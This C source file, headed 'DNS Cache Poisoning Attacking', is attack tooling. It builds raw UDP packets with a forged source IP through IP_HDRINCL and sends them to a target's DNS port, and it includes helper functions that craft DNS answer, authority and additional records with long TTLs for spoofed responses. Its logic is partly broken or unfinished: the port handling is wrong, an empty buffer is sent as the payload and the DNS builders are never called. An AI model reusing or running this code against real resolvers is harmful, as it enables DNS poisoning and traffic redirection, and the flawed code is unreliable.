// DNS Cache Poisoning Attacking
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <signal.h>
#include <sys/wait.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>

#ifndef u8
#define u8  unsigned char
#endif

#ifndef u16
#define u16 unsigned short
#endif

#ifndef u32
#define u32 unsigned long
#endif



struct DNS_header {
	unsigned short QID;
	unsigned short opt;
	unsigned short Questions;
	unsigned short Answer_RRS;
	unsigned short Authority_RRS;
	unsigned short Additional_RRS;
};

struct Quset {

	unsigned short Type;
	unsigned short Class;
};

struct RR {
	unsigned short TTL[2];
	unsigned short Rdata_len;
};

struct ip_header {
	u8  ihl:4,
	    version:4;
	u8  tos;
	u16 tot_len;
	u16 id;
	u16 frag_off;
	u8  ttl;
	u8  protocol;
	u16 check;
	u32 saddr;
	u32 daddr;
};

struct udp_header {
	u16 source;
	u16 dest;
	u16 len;
	u16 check;
};

struct udp_packet {
	struct ip_header iph;
	struct udp_header udph;
};



void kill_sock( int sig );
void sig_child( int signo );

unsigned short csum(unsigned short *addr, int len);

struct in_addr *atoaddr(char *address);
int cpy_url( unsigned char* url_ptr , unsigned char* buffer );
unsigned int add_dns_header( unsigned char* h_ptr , unsigned short opt , 
		unsigned short que , unsigned short ans , unsigned short aut , unsigned short add );
unsigned int add_que_header( unsigned char* h_ptr , unsigned char *url , unsigned short type );
unsigned int add_ans_header( unsigned char* h_ptr , unsigned short data_len );
unsigned int add_aut_header( unsigned char* h_ptr , unsigned short data_len );
unsigned int add_add_header( unsigned char* h_ptr , unsigned short data_len , unsigned char *data );
unsigned int add_edns0_header(unsigned char* h_ptr);

unsigned char   buffer[1024];
unsigned char	attack[1024];

int     sock , sock_attack;

int main ( int argc , char *argv[] )
{
	int     port , server_len , olen;
	struct	ip_header *iph;
	struct  udp_header *udph;
	struct  udp_packet *packet;
	struct  sockaddr_in server_addr;
	int 	ret , url_len , send_len;
	unsigned char	target_url[256];
	unsigned char	dst_host[256];
	unsigned char	SendMessage[128];
	int 		i , j;

	strncpy(SendMessage,"hacker test",strlen("hacker test")-1);

	if( argc != 3 && argc != 4 )
	{
		fprintf(stderr,"usage: %s TargetHost DstHost [Port]\n",argv[0]);
		return 1;
	}

	// init target url array
	for ( i = 0 ; i < 256 ; i++ ){
		target_url[i] = '\0';
		dst_host[i] = '\0';
	}
	strncpy( target_url , argv[1] , strlen(argv[1]) );
	strncpy( dst_host , argv[2] , strlen(argv[2]) );
	// init target port (default port 53)
	port = 53;
	if ( argc == 3 ){
		port = atoi(argv[3]);
	}
	printf("Target Host: %s\n",target_url);

	// start up query socket 
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(port);
	server_addr.sin_addr.s_addr = inet_addr(target_url);//addr->s_addr;
	bzero(&(server_addr.sin_zero),8);

	// init attack raw socket
	if ( (sock_attack = socket(AF_INET, SOCK_RAW , IPPROTO_UDP )) == -1 )
	{
		perror("Unable to create Socket");
		return 1;
	}

	olen = 1;
	if ( setsockopt(sock_attack , IPPROTO_IP, IP_HDRINCL, &olen, sizeof(olen)) == -1 )
		perror("ERROR: could not set socket option IP_HDRINCL.");

	send_len = strlen(SendMessage);
	server_len = sizeof( struct sockaddr_in );
	printf ("Message Length: %s %d\n",SendMessage,send_len);
	// create raw socket packet
	packet 		= calloc( 1 , sizeof(struct udp_packet) + send_len );
	iph 		= &packet->iph;
	udph 		= &packet->udph;;

	// init IP header
	iph->ihl       	= 5;
	iph->version   	= 4;
	iph->tos       	= 0;
	iph->tot_len   	= sizeof(struct udp_packet) + send_len;
	iph->id        	= htonl(0xbeef);
	iph->frag_off  	= 0;
	iph->ttl       	= 255;
	iph->protocol  	= 17;
	iph->saddr      = inet_addr(target_url);
	iph->daddr      = inet_addr(dst_host);
	iph->check      = csum((unsigned short *)iph, sizeof(struct ip_header));

	// init UDP header
	udph->len      	= htons(sizeof(struct udp_header) + send_len);
	udph->check  	= 0;
	udph->source 	= htons(port);
	udph->dest   	= htons(port);
	memcpy( (unsigned char*)&packet[1] , attack , send_len);
	//(&packet->iph)->saddr      = inet_addr(target_url);	

	for( i = 0 ; i < 6 ; i++ )
	{
		sendto( sock_attack , packet , sizeof(struct udp_packet) + send_len ,  0 , (struct sockaddr*)&server_addr , server_len );
	}

	return 0;
}

unsigned int add_dns_header( unsigned char* h_ptr , unsigned short opt , 
		unsigned short que , unsigned short ans , unsigned short aut , unsigned short add )
{
	struct 	DNS_header *dns_ptr;
	int	len;

	dns_ptr = (struct DNS_header*)h_ptr;

	dns_ptr->QID = htons(0x5000);
	dns_ptr->opt = htons(opt);
	dns_ptr->Questions = htons(que);
	dns_ptr->Answer_RRS = htons(ans);
	dns_ptr->Authority_RRS = htons(aut);
	dns_ptr->Additional_RRS = htons(add);

	len = sizeof( struct DNS_header );
	return len;
}

unsigned int add_que_header( unsigned char* h_ptr , unsigned char *url , unsigned short type  )
{
	struct Quset *query;
	int len;
	//printf("%s",url);
	len = cpy_url( url , h_ptr );
	//printf("%d\n",len);
	query =(struct Quset*) (h_ptr+len);
	query->Type = htons(type);
	query->Class = htons(0x01);
	len += sizeof( struct Quset );
	return len;
}

unsigned int add_ans_header( unsigned char* h_ptr , unsigned short data_len )
{
	struct Quset *query;
	struct RR *rr;
	int len;

	query = ( struct Quset *)h_ptr;
	query->Type = htons(0x01);
	query->Class = htons(0x01);
	rr = (struct RR*)&query[1];
	rr->TTL[0] = htons(0x0002);
	rr->TTL[1] = htons(0xa300);
	rr->Rdata_len = htons(data_len);
	len = sizeof(struct Quset) + sizeof(struct RR);

	return len;
}

unsigned int add_aut_header( unsigned char* h_ptr , unsigned short data_len  )
{
	struct Quset *query;
	struct RR *rr;
	int len;

	query = ( struct Quset *)h_ptr;
	query->Type = htons(0x02);
	query->Class = htons(0x01);
	rr = (struct RR*)&query[1];
	rr->TTL[0] = htons(0x0002);
	rr->TTL[1] = htons(0xa300);
	rr->Rdata_len = htons(data_len);
	len = sizeof(struct Quset) + sizeof(struct RR);

	return len;
}

unsigned int add_add_header( unsigned char* h_ptr , unsigned short data_len , unsigned char *data )
{
	struct Quset *query;
	struct RR *rr;
	unsigned char *p;
	int len;
	query = ( struct Quset *)h_ptr;
	query->Type = htons(0x01);
	query->Class = htons(0x01);
	rr = (struct RR*)&query[1];
	rr->TTL[0] = htons(0x0002);
	rr->TTL[1] = htons(0xa300);
	rr->Rdata_len = htons(data_len);
	p = (unsigned char*)&rr[1];
	strncpy( p , data , data_len);
	// edns0 opt
	/*
	p = p + data_len;
	p[0] = 0;
	query = ( struct Quset *)&p[1];
	query->Type = htons(0x29);
	query->Class = htons(0x1000);
	rr = (struct RR*)&query[1];
	rr->TTL[0] = htons(0x0000);
	rr->TTL[1] = htons(0x8000);
	rr->Rdata_len = 0;*/
	len = sizeof(struct Quset) + sizeof(struct RR) + data_len;

	return len;
}
unsigned int add_edns0_header(unsigned char* h_ptr)
{
	struct Quset *query;
        struct RR *rr;
        unsigned char *p;
        int len;
	p = h_ptr;
	p[0] = 0;
        query = ( struct Quset *)&p[1];
        query->Type = htons(0x29);
        query->Class = htons(0x1000);
        rr = (struct RR*)&query[1];
        rr->TTL[0] = htons(0x0000);
        rr->TTL[1] = htons(0x8000);
        rr->Rdata_len = 0;
	len = 1 + sizeof(struct Quset) + sizeof(struct RR);

	return len;
}
struct in_addr *atoaddr(char *address)
{
	struct hostent *host;
	static struct in_addr saddr;

	/* First try it as aaa.bbb.ccc.ddd. */
	saddr.s_addr = inet_addr(address);
	if (saddr.s_addr != -1) {
		return &saddr;
	}
	host = gethostbyname(address);
	if (host) {
		return (struct in_addr *) *host->h_addr_list;
	}
	return NULL;
}

int cpy_url( unsigned char* url_ptr , unsigned char* buffer )
{
	//unsigned char buffer[256];
	unsigned char counter; //8 bit
	unsigned char *tmp_ptr;
	int url_len = 0;

	while ( *url_ptr != '\0' )
	{	
		counter = 0x0;
		tmp_ptr = url_ptr;
		while ( *url_ptr != '.' && *url_ptr != '\0')
		{
			counter++;
			url_ptr++;
		}
		*url_ptr = '\0';
		buffer[(int)url_len++] = counter;
		strncpy( (buffer+(int)url_len) , tmp_ptr , counter );
		url_len += (int) counter;
		url_ptr++;
		tmp_ptr = url_ptr;
		//printf("%s , %d , %d\n",tmp_ptr , (int)counter , url_len);
		//printf(" %s\n",buffer);
	}
	buffer[(int)url_len++] = 0x0;
	return url_len;
}

void    kill_sock( int sig )
{
	pid_t   pid;
	int     stat;
	kill( 0, SIGTERM );

	close( sock );
	exit(0);
}

void sig_child( int signo )
{
	pid_t   pid;
	int     stat;

	while( (pid = waitpid(-1,&stat,WNOHANG)) > 0 )
	{
		//fprintf(stderr,"child %d terminated\n",pid);
	}
	return;
}


unsigned short csum(unsigned short *addr, int len) {
	register int sum = 0;
	u_short answer = 0;
	register u_short *w = addr;
	register int nleft = len;

	while (nleft > 1)  {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w ;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;
	return(answer); /* return the checksum value. */
}
